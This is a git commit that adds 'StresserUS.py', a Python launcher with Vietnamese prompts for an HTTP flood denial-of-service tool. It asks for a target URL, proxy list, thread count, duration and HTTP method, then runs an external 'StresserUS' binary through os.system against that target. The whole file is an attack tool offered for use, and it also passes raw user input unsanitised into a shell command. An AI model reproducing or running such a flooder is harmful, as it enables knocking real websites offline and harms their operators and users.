09d0b72f91baf8dfa0ae4f244ab2f3c073f1ed04
daudau432 <aulax432@gmail.com>
2022-11-08 17:43:13 +0700

    StresserUS-httpflood

---
+++ StresserUS.py
@@ -0,0 +1,21 @@
+import os
+os.system("cls" if os.name == "nt" else "clear")
+a='''
+  @@@@@@ @@@@@@@ @@@@@@@  @@@@@@@@  @@@@@@  @@@@@@ @@@@@@@@ @@@@@@@  @@@  @@@  @@@@@@
+ !@@       @@!   @@!  @@@ @@!      !@@     !@@     @@!      @@!  @@@ @@!  @@@ !@@    
+  !@@!!    @!!   @!@!!@!  @!!!:!    !@@!!   !@@!!  @!!!:!   @!@!!@!  @!@  !@!  !@@!! 
+     !:!   !!:   !!: :!!  !!:          !:!     !:! !!:      !!: :!!  !!:  !!!     !:!
+ ::.: :     :     :   : : : :: ::: ::.: :  ::.: :  : :: :::  :   : :  :.:: :  ::.: : 
+                                                                   HTTPLOOD - Đậu Đậu                                                                                          
+	'''
+print(a)
+URL=input("  [+] Nhập URL Taget: ")
+LIMIT=int(input("  [+] Nhập số limit (64): "))
+TIME=int(input("  [+] Nhập Time (s): "))
+LIST=input("  [+] Nhập file proxy (http.txt): ")
+THREADS=(input("  [+] Nhập số luồng: "))
+METHOD=input("  [+] Nhập method (GET, POST, HEAD): ")
+print("=========================================")
+print("  Đã gửi yêu cầu\n")
+os.system(f"./StresserUS version=2 host={URL} limit={LIMIT} time={TIME} list={LIST} threads={THREADS} mode={METHOD}")
+input()
